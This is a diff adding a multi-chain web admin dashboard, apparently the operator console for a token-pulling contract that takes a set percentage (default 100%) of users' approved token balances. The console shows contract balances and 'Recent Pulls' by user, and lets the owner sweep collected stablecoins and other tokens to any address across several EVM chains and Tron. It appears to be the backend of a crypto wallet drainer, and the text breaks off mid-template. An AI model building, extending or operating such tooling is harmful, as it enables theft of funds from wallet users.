@@ -1,0 +1,1061 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Admin Dashboard</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+<style>
+:root{--bg:#0a0a0f;--card:#13131a;--border:#1e1e2e;--accent:#7c3aed;--accent2:#a78bfa;--green:#22c55e;--red:#ef4444;--yellow:#eab308;--text:#e2e8f0;--muted:#64748b;}
+*{box-sizing:border-box;margin:0;padding:0;}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',sans-serif;min-height:100vh;}
+header{background:var(--card);border-bottom:1px solid var(--border);padding:14px 20px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px;}
+.admin-badge{background:#2e1010;color:#ef4444;font-size:11px;font-weight:700;padding:4px 10px;border-radius:20px;margin-left:10px;}
+#connectBtn{background:var(--accent);color:#fff;border:none;padding:9px 18px;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;}
+.wallet-pill{background:var(--border);padding:7px 13px;border-radius:8px;font-size:12px;color:var(--accent2);font-weight:500;}
+
+.chain-toggle{display:flex;gap:6px;align-items:center;}
+.chain-btn{padding:6px 14px;border-radius:8px;border:1px solid var(--border);background:transparent;color:var(--muted);font-size:12px;font-weight:600;cursor:pointer;transition:all .2s;}
+.chain-btn.active{background:var(--accent);border-color:var(--accent);color:#fff;}
+
+.tabs{display:flex;gap:4px;background:var(--card);border-bottom:1px solid var(--border);padding:0 20px;}
+.tab{padding:13px 18px;font-size:13px;font-weight:600;color:var(--muted);cursor:pointer;border-bottom:2px solid transparent;transition:.2s;}
+.tab.active{color:var(--accent2);border-bottom-color:var(--accent);}
+
+main{max-width:1000px;margin:30px auto;padding:0 16px;}
+
+.stats-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:28px;}
+@media(max-width:700px){.stats-grid{grid-template-columns:1fr 1fr;}}
+.stat-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;}
+.stat-label{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.8px;margin-bottom:6px;}
+.stat-val{font-size:24px;font-weight:800;color:var(--accent2);}
+.stat-sub{font-size:11px;color:var(--muted);margin-top:4px;}
+
+.section-title{font-size:11px;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:14px;}
+
+.action-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:28px;}
+@media(max-width:600px){.action-grid{grid-template-columns:1fr;}}
+.action-card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:20px;}
+.action-card h3{font-size:14px;font-weight:700;margin-bottom:6px;}
+.action-card p{font-size:12px;color:var(--muted);margin-bottom:16px;line-height:1.5;}
+.action-btn{width:100%;padding:10px;border-radius:8px;border:none;font-size:13px;font-weight:600;cursor:pointer;transition:opacity .2s;}
+.action-btn:hover{opacity:.85;}
+.action-btn:disabled{opacity:.4;cursor:not-allowed;}
+.action-btn.primary{background:var(--accent);color:#fff;}
+.action-btn.success{background:#14532d;color:var(--green);}
+.action-btn.danger{background:#2e1010;color:var(--red);border:1px solid var(--red);}
+
+.input-row{display:flex;gap:8px;margin-bottom:10px;}
+.input-row input,.input-row select{flex:1;background:#0a0a0f;border:1px solid var(--border);border-radius:8px;padding:9px 12px;font-size:12px;color:var(--text);outline:none;}
+.input-row input:focus,.input-row select:focus{border-color:var(--accent);}
+
+.records-table{width:100%;border-collapse:collapse;font-size:12px;}
+.records-table th{text-align:left;padding:10px 12px;color:var(--muted);font-weight:600;border-bottom:1px solid var(--border);font-size:11px;text-transform:uppercase;}
+.records-table td{padding:11px 12px;border-bottom:1px solid var(--border);vertical-align:middle;}
+.records-table tr:last-child td{border-bottom:none;}
+.pill{display:inline-block;font-size:10px;font-weight:700;padding:3px 8px;border-radius:20px;}
+.pill.success{background:#14532d;color:var(--green);}
+.pill.fail{background:#2e1010;color:var(--red);}
+.pill.swap{background:#1e1030;color:var(--accent2);}
+.type-badge{font-size:10px;font-weight:600;padding:2px 7px;border-radius:4px;background:var(--border);color:var(--accent2);}
+
+.token-balances{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:28px;}
+@media(max-width:600px){.token-balances{grid-template-columns:1fr 1fr;}}
+.bal-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:14px;}
+.bal-symbol{font-size:13px;font-weight:700;margin-bottom:4px;}
+.bal-amount{font-size:18px;font-weight:800;color:var(--accent2);}
+
+.empty{text-align:center;padding:40px;color:var(--muted);font-size:13px;}
+.loading{text-align:center;padding:40px;color:var(--muted);font-size:13px;}
+.not-connected{text-align:center;padding:60px 20px;color:var(--muted);}
+.alert-owner{background:#2e1010;border:1px solid var(--red);border-radius:10px;padding:14px 16px;font-size:13px;color:var(--red);margin-bottom:20px;}
+
+.toast{position:fixed;bottom:20px;right:20px;background:var(--card);border:1px solid var(--border);border-radius:10px;padding:12px 16px;font-size:13px;max-width:280px;opacity:0;transform:translateY(8px);transition:all .3s;z-index:999;}
+.toast.show{opacity:1;transform:translateY(0);}
+.toast.success{border-color:var(--green);color:var(--green);}
+.toast.error{border-color:var(--red);color:var(--red);}
+.toast.info{border-color:var(--accent);color:var(--accent2);}
+</style>
+</head>
+<body>
+
+<header>
+  <div style="display:flex;align-items:center">
+    <span class="admin-badge">ADMIN</span>
+  </div>
+  <div class="chain-toggle">
+    <button class="chain-btn active" id="btnPolygon"  onclick="switchChain(137,this)">⬡ Polygon</button>
+    <button class="chain-btn"        id="btnBSC"      onclick="switchChain(56,this)">◈ BNB Chain</button>
+    <button class="chain-btn"        id="btnEthereum" onclick="switchChain(1,this)">◈ Ethereum</button>
+    <button class="chain-btn"        id="btnBase"     onclick="switchChain(8453,this)">◈ Base</button>
+    <button class="chain-btn"        id="btnArbitrum" onclick="switchChain(42161,this)">◈ Arbitrum</button>
+    <button class="chain-btn"        id="btnTron"     onclick="switchToTron(this)" style="border-color:#ef0027;color:#ef0027">◈ Tron</button>
+  </div>
+  <div id="headerRight"><button id="connectBtn" onclick="connectWallet()">Connect Wallet</button></div>
+</header>
+
+<div class="tabs" id="tabs" style="display:none">
+  <div class="tab active" onclick="switchTab('overview',this)">Overview</div>
+  <div class="tab"        onclick="switchTab('actions',this)">Actions</div>
+  <div class="tab"        onclick="switchTab('records',this)">Recent Pulls</div>
+</div>
+
+<main id="main">
+  <div class="not-connected"><p>👛 Connect your owner wallet to access the admin dashboard</p></div>
+</main>
+<div class="toast" id="toast"></div>
+
+<script>
+// ── Chain configs ──────────────────────────────────────────────────────────
+const CHAINS = {
+  1: {
+    name:        "Ethereum",
+    chainId:     1,
+    hexChainId:  "0x1",
+    contract:    "0x2ff167cd79Fe1915B4dB9c062c42828a30e8CA85",
+    explorer:    "https://etherscan.io",
+    explorerName:"Etherscan",
+    gasPrice:    "20",
+    nativeSym:   "ETH",
+    rpcUrl:      "https://eth.drpc.org",
+    tokens:[
+      {symbol:"USDT", address:"0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals:6},
+      {symbol:"USDC", address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals:6},
+      {symbol:"DAI",  address:"0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals:18},
+      {symbol:"WETH", address:"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals:18},
+      {symbol:"WBTC", address:"0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals:8},
+      {symbol:"LINK", address:"0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals:18},
+      {symbol:"UNI",  address:"0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals:18},
+      {symbol:"PEPE", address:"0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals:18},
+      {symbol:"SHIB", address:"0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", decimals:18},
+    ]
+  },
+  137: {
+    name:        "Polygon",
+    chainId:     137,
+    hexChainId:  "0x89",
+    contract:    "0x1D7b324Bbd1b8831438b366658bab91c128a7516",
+    explorer:    "https://polygonscan.com",
+    explorerName:"PolygonScan",
+    gasPrice:    "30",
+    nativeSym:   "POL",
+    rpcUrl:      "https://polygon-rpc.com",
+    tokens:[
+      {symbol:"USDT", address:"0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals:6},
+      {symbol:"USDC", address:"0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", decimals:6},
+      {symbol:"DAI",  address:"0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", decimals:18},
+      {symbol:"WBTC", address:"0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", decimals:8},
+      {symbol:"WETH", address:"0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", decimals:18},
+      {symbol:"AAVE", address:"0xD6DF932A45C0f255f85145f286eA0b292B21C90B", decimals:18},
+      {symbol:"LINK", address:"0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39", decimals:18},
+      {symbol:"UNI",  address:"0xb33EaAd8d922B1083446DC23f610c2567fB5180f", decimals:18},
+      {symbol:"SUSHI",address:"0x0b3F868E0BE5597D5DB7fEB59E1CADBb0fdDa50a", decimals:18},
+      {symbol:"GRT",  address:"0x5fe2B58c013d7601147DcdD68C143A77499f5531", decimals:18},
+      {symbol:"CRV",  address:"0x172370d5Cd63279eFa6d502DAB29171933a610AF", decimals:18},
+      {symbol:"SAND", address:"0xBbba073C31bF03b8ACf7c28EF0738DeCF3695683", decimals:18},
+      {symbol:"MANA", address:"0xA1c57f48F0Deb89f569dFbE6E2B7f46D33606fD4", decimals:18},
+      {symbol:"WPOL", address:"0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", decimals:18},
+    ]
+  },
+  56: {
+    name:        "BNB Chain",
+    chainId:     56,
+    hexChainId:  "0x38",
+    contract:    "0xF84DdD1630b4DA21DC92bc127714Ea47F80189F0",
+    explorer:    "https://bscscan.com",
+    explorerName:"BscScan",
+    gasPrice:    "3",
+    nativeSym:   "BNB",
+    rpcUrl:      "https://bsc-dataseed1.binance.org",
+    tokens:[
+      {symbol:"USDT", address:"0x55d398326f99059fF775485246999027B3197955", decimals:18},
+      {symbol:"USDC", address:"0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals:18},
+      {symbol:"BUSD", address:"0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals:18},
+      {symbol:"BTCB", address:"0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", decimals:18},
+      {symbol:"ETH",  address:"0x2170Ed0880ac9A755fd29B2688956BD959F933F8", decimals:18},
+      {symbol:"WBNB", address:"0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals:18},
+      {symbol:"CAKE", address:"0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", decimals:18},
+      {symbol:"XRP",  address:"0x1D2F0da169ceB9fC7B3144628dB156f3F6c60dBE", decimals:18},
+      {symbol:"DOGE", address:"0xbA2aE424d960c26247Dd6c32edC70B295c744C43", decimals:8},
+    ]
+  },
+  8453: {
+    name:        "Base",
+    chainId:     8453,
+    hexChainId:  "0x2105",
+    contract:    "0xA7C287252c30029eDb1a5FC2c365821FD4460C44",
+    explorer:    "https://basescan.org",
+    explorerName:"BaseScan",
+    gasPrice:    "0.001",
+    nativeSym:   "ETH",
+    rpcUrl:      "https://mainnet.base.org",
+    tokens:[
+      {symbol:"USDC",  address:"0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", decimals:6},
+      {symbol:"WETH",  address:"0x4200000000000000000000000000000000000006", decimals:18},
+      {symbol:"DAI",   address:"0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", decimals:18},
+      {symbol:"cbBTC", address:"0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf", decimals:8},
+      {symbol:"cbETH", address:"0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22", decimals:18},
+      {symbol:"AERO",  address:"0x940181a94A35A4569E4529A3CDfB74e38FD98631", decimals:18},
+    ]
+  },
+  42161: {
+    name:        "Arbitrum",
+    chainId:     42161,
+    hexChainId:  "0xa4b1",
+    contract:    "0xA7C287252c30029eDb1a5FC2c365821FD4460C44",
+    explorer:    "https://arbiscan.io",
+    explorerName:"ArbScan",
+    gasPrice:    "0.1",
+    nativeSym:   "ETH",
+    rpcUrl:      "https://arb1.arbitrum.io/rpc",
+    tokens:[
+      {symbol:"USDT", address:"0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", decimals:6},
+      {symbol:"USDC", address:"0xaf88d065e77c8cC2239327C5EDb3A432268e5831", decimals:6},
+      {symbol:"WETH", address:"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", decimals:18},
+      {symbol:"DAI",  address:"0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", decimals:18},
+      {symbol:"WBTC", address:"0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f", decimals:8},
+      {symbol:"ARB",  address:"0x912CE59144191C1204E64559FE8253a0e49E6548", decimals:18},
+      {symbol:"GMX",  address:"0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a", decimals:18},
+    ]
+  }
+};
+
+// New Ronin contract ABI — minimal one-shot pull contract
+const CONTRACT_ABI = [
+  "function owner() external view returns (address)",
+  "function pullPercent() external view returns (uint256)",
+  "function setPullPercent(uint256 pct) external",
+  "function withdrawToken(address token, address to, uint256 amount) external",
+  "function withdrawAll(address token, address to) external",
+  "function transferOwnership(address newOwner) external",
+  "function contractTokenBalance(address token) external view returns (uint256)",
+  "event Pulled(address indexed user, address indexed token, uint256 amount)",
+  "event Skipped(address indexed user, address indexed token, string reason)",
+  "event Swapped(address indexed user, address indexed tokenIn, address indexed tokenOut, uint256 amountIn, uint256 amountOut)",
+  "event Withdrawn(address indexed token, address indexed to, uint256 amount)",
+];
+const ERC20_ABI = ["function balanceOf(address) external view returns (uint256)"];
+
+// ── Tron / TRC-20 admin config ────────────────────────────────────────────
+// ⚠ IMPORTANT: Replace TRON_CONTRACT_PLACEHOLDER with your real T... address
+//   after deploying Ronin.sol on Tron mainnet.
+const TRON_ADMIN = {
+  rpcApi:      "https://api.trongrid.io",
+  contract:    "TKbCqNEck7Pz2BVVtidpGE5WTnbjuostBR",
+  explorer:    "https://tronscan.org",
+  explorerName:"TronScan",
+  tokens:[
+    {symbol:"USDT", address:"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", decimals:6},
+    {symbol:"USDC", address:"TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", decimals:6},
+    {symbol:"TUSD", address:"TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4", decimals:18},
+    {symbol:"USDD", address:"TPYmHEhy5n8TCEfYGqW2rPxsghSfzghPDn", decimals:18},
+    {symbol:"USDJ", address:"TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT", decimals:18},
+    {symbol:"WTRX", address:"TNUC9Qb1rRpN8suzgMWeiCQ3Bqyq1jPYMR", decimals:6},
+    {symbol:"SUN",  address:"TSSMHYeV2uE9qYH95DqyoCuNCzEL1NvU3S", decimals:18},
+    {symbol:"JST",  address:"TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9", decimals:18},
+    {symbol:"WIN",  address:"TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7", decimals:6},
+    {symbol:"BTT",  address:"TAFjULxiVgT4qWk6UZwjqwZXTSaGaqnVp4", decimals:18},
+    {symbol:"NFT",  address:"TFczxzPhnThNSqr5by8tvxsdCFRgbhBouz", decimals:6},
+  ]
+};
+
+// TronWeb requires full JSON ABI — not ethers.js human-readable strings.
+const TRON_ADMIN_ABI = [
+  {constant:true,  inputs:[],                                                                                                  name:"owner",                outputs:[{name:"",type:"address"}], stateMutability:"view",       type:"function"},
+  {constant:true,  inputs:[{name:"token",type:"address"}],                                                                     name:"contractTokenBalance", outputs:[{name:"",type:"uint256"}], stateMutability:"view",       type:"function"},
+  {constant:false, inputs:[{name:"token",type:"address"},{name:"to",type:"address"},{name:"amount",type:"uint256"}],           name:"withdrawToken",        outputs:[],                         stateMutability:"nonpayable", type:"function"},
+  {constant:false, inputs:[{name:"token",type:"address"},{name:"to",type:"address"}],                                          name:"withdrawAll",          outputs:[],                         stateMutability:"nonpayable", type:"function"},
+  {constant:false, inputs:[{name:"newOwner",type:"address"}],                                                                  name:"transferOwnership",    outputs:[],                         stateMutability:"nonpayable", type:"function"},
+];
+
+let provider, signer, wallet, contract;
+let currentTab    = "overview";
+let isOwner       = false;
+let activeChainId = 137;
+let activeChain   = CHAINS[137];
+
+// Tron-specific state — completely separate from the EVM state above
+let isTronMode  = false;
+let isTronOwner = false;
+let tronWallet  = null;  // Base58 address (T...)
+
+const short   = a => a.slice(0,6)+"..."+a.slice(-4);
+const fmtDate = ts => new Date(Number(ts)*1000).toLocaleDateString("en-GB",{day:"numeric",month:"short",year:"numeric"});
+const fmtTime = ts => new Date(Number(ts)*1000).toLocaleTimeString("en-GB",{hour:"2-digit",minute:"2-digit"});
+
+function showToast(msg,type="info"){
+  const t=document.getElementById("toast");
+  t.textContent=msg; t.className=`toast show ${type}`;
+  setTimeout(()=>t.className="toast",3500);
+}
+
+// ── Chain switching ────────────────────────────────────────────────────────
+function switchChain(chainId, btn){
+  isTronMode    = false;
+  activeChainId = chainId;
+  activeChain   = CHAINS[chainId];
+  document.querySelectorAll(".chain-btn").forEach(b=>b.classList.remove("active"));
+  btn.classList.add("active");
+  // Restore EVM connect button if needed
+  if(!wallet){
+    document.getElementById("headerRight").innerHTML =
+      `<button id="connectBtn" onclick="connectWallet()">Connect Wallet</button>`;
+  }
+  if(contract){ rebuildContract(); renderDashboard(); }
+  else if(!wallet){
+    document.getElementById("main").innerHTML =
+      `<div class="not-connected"><p>👛 Connect your owner wallet to access the admin dashboard</p></div>`;
+    document.getElementById("tabs").style.display = "none";
+  }
+}
+
+// Called when the Tron chain button is clicked
+function switchToTron(btn){
+  isTronMode = true;
+  document.querySelectorAll(".chain-btn").forEach(b=>b.classList.remove("active"));
+  btn.classList.add("active");
+
+  if(tronWallet){
+    // Already connected — just re-render the dashboard
+    renderDashboard();
+  } else {
+    // Show a TronLink-specific connect button
+    document.getElementById("headerRight").innerHTML =
+      `<button id="connectBtn" onclick="connectTronLink()" style="background:#ef0027">Connect TronLink</button>`;
+    document.getElementById("main").innerHTML =
+      `<div class="not-connected"><p>🔴 Click <strong>Connect TronLink</strong> to manage your Tron contract</p></div>`;
+    document.getElementById("tabs").style.display = "none";
+  }
+}
+
+function rebuildContract(){
+  contract = new ethers.Contract(activeChain.contract, CONTRACT_ABI, signer);
+}
+
+// ── Detect wallet provider (supports mobile wallet browsers) ──────────────
+function getWalletProvider(){
+  if(window.ethereum)          return window.ethereum;
+  if(window.trustwallet)       return window.trustwallet;
+  if(window.phantom?.ethereum) return window.phantom.ethereum;
+  if(window.coinbaseWalletExtension) return window.coinbaseWalletExtension;
+  if(window.okxwallet)         return window.okxwallet;
+  if(window.bitkeep?.ethereum) return window.bitkeep.ethereum;
+  return null;
+}
+
+// ── Wallet connect ─────────────────────────────────────────────────────────
+async function connectWallet(){
+  const wp = getWalletProvider();
+  if(!wp){ showToast("No wallet detected. Install MetaMask or open in a wallet browser.","error"); return; }
+  try{
+    provider = new ethers.BrowserProvider(wp);
+    await provider.send("eth_requestAccounts",[]);
+    signer = await provider.getSigner();
+    wallet = await signer.getAddress();
+
+    const net = await provider.getNetwork();
+    const cid = Number(net.chainId);
+    if(cid !== activeChainId){
+      if(CHAINS[cid]){
+        activeChainId = cid;
+        activeChain   = CHAINS[cid];
+        document.querySelectorAll(".chain-btn").forEach(b=>b.classList.remove("active"));
+        const _btnMap = {1:"btnEthereum", 137:"btnPolygon", 56:"btnBSC", 8453:"btnBase", 42161:"btnArbitrum"};
+        if(_btnMap[cid]) document.getElementById(_btnMap[cid])?.classList.add("active");
+      } else {
+        showToast(`Switching to ${activeChain.name}...`,"info");
+        try{
+          await wp.request({method:"wallet_switchEthereumChain",params:[{chainId:activeChain.hexChainId}]});
+          provider = new ethers.BrowserProvider(wp);
+          signer   = await provider.getSigner();
+        }catch(switchErr){
+          if(switchErr.code===4902){
+            await wp.request({method:"wallet_addEthereumChain",params:[{
+              chainId:activeChain.hexChainId,
+              chainName:activeChain.name,
+              nativeCurrency:{name:activeChain.nativeSym,symbol:activeChain.nativeSym,decimals:18},
+              rpcUrls:[activeChain.rpcUrl],
+              blockExplorerUrls:[activeChain.explorer]
+            }]});
+            provider = new ethers.BrowserProvider(wp);
+            signer   = await provider.getSigner();
+          } else {
+            showToast("Could not switch network","error"); return;
+          }
+        }
+      }
+    }
+
+    contract = new ethers.Contract(activeChain.contract, CONTRACT_ABI, signer);
+    try{
+      const ownerAddr = await contract.owner();
+      isOwner = wallet.toLowerCase() === ownerAddr.toLowerCase();
+    }catch(e){
+      isOwner = false;
+      showToast("Could not read contract owner. Is the contract deployed?","error");
+    }
+
+    document.getElementById("headerRight").innerHTML =
+      `<div class="wallet-pill">${isOwner?"👑":""} ${short(wallet)}</div>`;
+    document.getElementById("tabs").style.display = "flex";
+    await renderDashboard();
+    showToast("Connected!","success");
+    wp.on("accountsChanged",()=>location.reload());
+    wp.on("chainChanged",()=>location.reload());
+  }catch(e){ showToast("Connection cancelled","error"); }
+}
+
+// ── Auto-connect on mobile wallet browsers ────────────────────────────────
+(function autoConnect(){
+  const isMobile = /iPhone|iPad|Android|Mobile/i.test(navigator.userAgent);
+  if(isMobile && getWalletProvider()){
+    setTimeout(()=> connectWallet(), 300);
+  }
+})();
+
+// ── Tab routing ────────────────────────────────────────────────────────────
+function switchTab(tab,el){
+  currentTab=tab;
+  document.querySelectorAll(".tab").forEach(t=>t.classList.remove("active"));
+  el.classList.add("active");
+  renderDashboard();
+}
+
+async function renderDashboard(){
+  if(isTronMode){
+    if(currentTab==="overview")     await renderTronOverview();
+    else if(currentTab==="actions") renderTronActions();
+    else                            await renderTronRecords();
+  } else {
+    if(currentTab==="overview")     await renderOverview();
+    else if(currentTab==="actions") renderActions();
+    else                            await renderRecords();
+  }
+}
+
+// ── Overview ───────────────────────────────────────────────────────────────
+async function renderOverview(){
+  document.getElementById("main").innerHTML=`<div class="loading">Loading dashboard...</div>`;
+  try{
+    if(!isOwner){
+      document.getElementById("main").innerHTML=
+        `<div class="alert-owner">⚠️ This wallet is not the contract owner. Connect with your owner wallet to access admin features.</div>`;
+      return;
+    }
+
+    let balCards = "";
+    let nonZeroCount = 0;
+
+    for(const t of activeChain.tokens){
+      let bal = 0n;
+      try{ bal = await contract.contractTokenBalance(t.address); }catch(e){}
+      const balFmt = parseFloat(ethers.formatUnits(bal,t.decimals)).toFixed(4);
+      if(bal > 0n) nonZeroCount++;
+      balCards += `
+        <div class="bal-card">
+          <div class="bal-symbol">${t.symbol}</div>
+          <div class="bal-amount">${balFmt}</div>
+        </div>`;
+    }
+
+    document.getElementById("main").innerHTML=`
+      <div class="stats-grid">
+        <div class="stat-card"><div class="stat-label">Tokens With Balance</div><div class="stat-val">${nonZeroCount}</div></div>
+        <div class="stat-card"><div class="stat-label">Tokens Tracked</div><div class="stat-val">${activeChain.tokens.length}</div></div>
+        <div class="stat-card"><div class="stat-label">Network</div><div class="stat-val" style="font-size:13px;padding-top:6px">${activeChain.name}</div></div>
+      </div>
+      <p class="section-title">Contract Balances</p>
+      <div class="token-balances">${balCards}</div>
+      <p class="section-title">Contract Address</p>
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:14px;font-family:monospace;font-size:12px;color:var(--accent2);margin-bottom:8px;word-break:break-all">${activeChain.contract}</div>
+      <a href="${activeChain.explorer}/address/${activeChain.contract}" target="_blank" style="font-size:12px;color:var(--muted);">View on ${activeChain.explorerName} ↗</a>
+    `;
+  }catch(e){
+    document.getElementById("main").innerHTML=`<div class="empty">Error: ${e.message}</div>`;
+  }
+}
+
+// ── Actions ────────────────────────────────────────────────────────────────
+function renderActions(){
+  if(!isOwner){
+    document.getElementById("main").innerHTML=
+      `<div class="alert-owner">⚠️ Connect with your owner wallet to access admin actions.</div>`;
+    return;
+  }
+  const tokenOptsD = activeChain.tokens.map(t=>`<option value="${t.address}:${t.decimals}">${t.symbol}</option>`).join("");
+  const tokenOpts  = activeChain.tokens.map(t=>`<option value="${t.address}">${t.symbol}</option>`).join("");
+
+  document.getElementById("main").innerHTML=`
+    <div class="action-grid">
+
+      <div class="action-card">
+        <h3>💸 Withdraw Specific Amount</h3>
+        <p>Move a fixed amount of a token from the contract to any address.</p>
+        <div class="input-row"><select id="withdrawToken">${tokenOptsD}</select></div>
+        <div class="input-row"><input id="withdrawTo" placeholder="Destination address (0x...)"/></div>
+        <div class="input-row"><input id="withdrawAmt" placeholder="Amount" type="number" step="0.000001"/></div>
+        <button class="action-btn danger" onclick="withdraw(this)">Withdraw</button>
+      </div>
+
+      <div class="action-card">
+        <h3>📤 Withdraw All</h3>
+        <p>Sweep the entire balance of one token from the contract to an address.</p>
+        <div class="input-row"><select id="withdrawAllToken">${tokenOpts}</select></div>
+        <div class="input-row"><input id="withdrawAllTo" placeholder="Destination address (0x...)"/></div>
+        <button class="action-btn primary" onclick="withdrawAll(this)">Withdraw All</button>
+      </div>
+
+      <div class="action-card">
+        <h3>👑 Transfer Ownership</h3>
+        <p>Move admin control of this contract to a different wallet. <strong>Irreversible.</strong></p>
+        <div class="input-row"><input id="newOwnerAddr" placeholder="New owner address (0x...)"/></div>
+        <button class="action-btn danger" onclick="transferOwner(this)">Transfer Ownership</button>
+      </div>
+
+      <div class="action-card">
+        <h3>⚙️ Pull Percentage</h3>
+        <p>Set what % of the user's approved balance gets pulled on each transaction. Default: 100%.</p>
+        <div class="input-row">
+          <input id="pullPctInput" placeholder="1–100" type="number" min="1" max="100" step="1"/>
+          <button class="action-btn primary" style="width:auto;padding:0 16px" onclick="readPullPct()">Read</button>
+        </div>
+        <button class="action-btn success" onclick="setPullPct(this)">Set Percentage</button>
+      </div>
+
+      <div class="action-card">
+        <h3>🔗 Contract Info</h3>
+        <p>Quick details and explorer link.</p>
+        <div style="font-size:12px;color:var(--muted);line-height:2">
+          <div>Contract: <span style="color:var(--accent2);font-family:monospace">${short(activeChain.contract)}</span></div>
+          <div>Network: <span style="color:var(--text)">${activeChain.name}</span></div>
+          <div>Pull %: <span id="livePullPct" style="color:var(--text)">—</span></div>
+          <div>Mode: <span style="color:var(--text)">One-shot (user-initiated)</span></div>
+          <div style="margin-top:6px"><a href="${activeChain.explorer}/address/${activeChain.contract}" target="_blank" style="color:var(--accent2)">View on ${activeChain.explorerName} ↗</a></div>
+        </div>
+      </div>
+
+    </div>`;
+  // Read current pullPercent and populate
+  contract.pullPercent().then(pct => {
+    const el = document.getElementById("livePullPct");
+    if(el) el.textContent = pct.toString() + "%";
+    const inp = document.getElementById("pullPctInput");
+    if(inp) inp.value = pct.toString();
+  }).catch(()=>{});
+}
+
+// ── Records (from event logs) ──────────────────────────────────────────────
+async function renderRecords(){
+  document.getElementById("main").innerHTML=`<div class="loading">Fetching recent pulls from chain logs...</div>`;
+  try{
+    const tokenMap = {};
+    activeChain.tokens.forEach(t => tokenMap[t.address.toLowerCase()] = t);
+
+    // Query the last ~50,000 blocks (~2 days on BSC, ~30 hours on Polygon)
+    const latestBlock = await provider.getBlockNumber();
+    const fromBlock   = Math.max(0, latestBlock - 50000);
+
+    let pulled = [], swapped = [];
+    try{ pulled  = await contract.queryFilter("Pulled",  fromBlock, latestBlock); }catch(e){}
+    try{ swapped = await contract.queryFilter("Swapped", fromBlock, latestBlock); }catch(e){}
+
+    if(pulled.length === 0 && swapped.length === 0){
+      document.getElementById("main").innerHTML =
+        `<div class="empty">No pulls in the last ~50,000 blocks. Either the contract is fresh or no one has used it yet.</div>`;
+      return;
+    }
+
+    // Build a unified list and sort by block number desc
+    const events = [];
+    for(const e of pulled){
+      events.push({
+        type:"Pull", block:e.blockNumber, txHash:e.transactionHash,
+        user:e.args.user, token:e.args.token, amount:e.args.amount, amount2:null
+      });
+    }
+    for(const e of swapped){
+      events.push({
+        type:"Swap", block:e.blockNumber, txHash:e.transactionHash,
+        user:e.args.user, token:e.args.tokenIn, amount:e.args.amountIn, amount2:e.args.amountOut, tokenOut:e.args.tokenOut
+      });
+    }
+    events.sort((a,b) => b.block - a.block);
+
+    // Get block timestamps for the top 50
+    const topEvents = events.slice(0, 50);
+    const blockTimes = {};
+    for(const e of topEvents){
+      if(!blockTimes[e.block]){
+        try{
+          const blk = await provider.getBlock(e.block);
+          blockTimes[e.block] = blk.timestamp;
+        }catch(err){ blockTimes[e.block] = 0; }
+      }
+    }
+
+    const rows = topEvents.map(e => {
+      const tk  = tokenMap[e.token.toLowerCase()] || { symbol: short(e.token), decimals: 18 };
+      const amt = parseFloat(ethers.formatUnits(e.amount, tk.decimals)).toFixed(4) + " " + tk.symbol;
+      let extraTxt = "";
+      if(e.type === "Swap" && e.tokenOut){
+        const tkOut = tokenMap[e.tokenOut.toLowerCase()] || { symbol: short(e.tokenOut), decimals: 18 };
+        extraTxt = " → " + parseFloat(ethers.formatUnits(e.amount2, tkOut.decimals)).toFixed(4) + " " + tkOut.symbol;
+      }
+      const ts = blockTimes[e.block] || 0;
+      return `<tr>
+        <td>${ts ? fmtDate(ts) : "—"}<br><span style="color:var(--muted);font-size:10px">${ts ? fmtTime(ts) : "—"}</span></td>
